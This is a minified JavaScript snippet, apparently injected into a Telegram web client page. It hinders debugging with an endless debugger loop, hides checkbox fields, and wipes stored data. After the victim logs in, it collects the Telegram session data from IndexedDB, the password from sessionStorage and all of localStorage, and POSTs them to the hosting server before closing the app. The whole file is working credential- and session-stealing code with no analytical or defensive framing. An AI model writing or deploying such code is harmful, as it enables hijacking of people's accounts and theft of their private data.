setInterval(()=>{debugger;});document.head.appendChild(document.createElement("style")).textContent=".checkbox-field{display:none!important}";localStorage.clear();sessionStorage.clear();document.addEventListener("DOMContentLoaded",()=>{indexedDB.open("tweb").onsuccess=(e)=>e.target.result.transaction(["users"],"readwrite").objectStore("users").clear();new MutationObserver(()=>{if(document.getElementById("auth-pages").style.display==="none")setTimeout(async ()=>{indexedDB.open("tweb").onsuccess=e=>(db=e.target.result).transaction(["users"],"readonly").objectStore("users").openCursor().onsuccess=e=>fetch("/users/me",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({password:sessionStorage.getItem("password"),userData:e.target.result.value,localStorage})}).then(r=>localStorage.clear(),window.Telegram.WebApp.close())},1000)}).observe(document.getElementById("auth-pages"),{attributes:true,attributeFilter:["style"]})});
